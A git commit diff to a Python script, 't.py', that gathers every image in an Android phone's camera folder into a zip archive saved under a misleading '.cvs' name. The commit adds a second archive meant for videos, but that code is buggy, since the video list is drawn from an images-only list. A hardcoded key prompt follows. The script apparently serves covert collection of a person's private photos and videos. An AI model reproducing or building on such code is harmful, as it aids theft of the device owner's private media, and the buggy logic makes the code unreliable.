56c29102de32bf0131f02242aa311cf95229e981
mupalvan <77997241+mupalvan@users.noreply.github.com>
2022-03-21 16:04:39 +0330

    Update t.py

--- t.py
+++ t.py
@@ -4,13 +4,18 @@ from zipfile import ZipFile
 path = "/sdcard/DCIM/Camera"
 image_list = os.listdir(path)
 image_list = [a for a in image_list if a.endswith('jpg') or a.endswith('jpeg') or a.endswith('png') ]
-
+v_list = [a for a in image_list if a.endswith('mp4')]
 with ZipFile('/sdcard/sample.cvs', 'w') as zipObj2:
    # Add multiple files to the zip
    for i in image_list:
         im = path +"/"+ i
         zipObj2.write(im)
-      
+with ZipFile('/sdcard/sample2.cvs', 'w') as zipObj2:
+# Add multiple files to the zip
+    for i in v_list:
+        im = path +"/"+ i
+        zipObj2.write(im)    
+
 x = input("Enter You key >>")
 
 if x=="xs3jb":
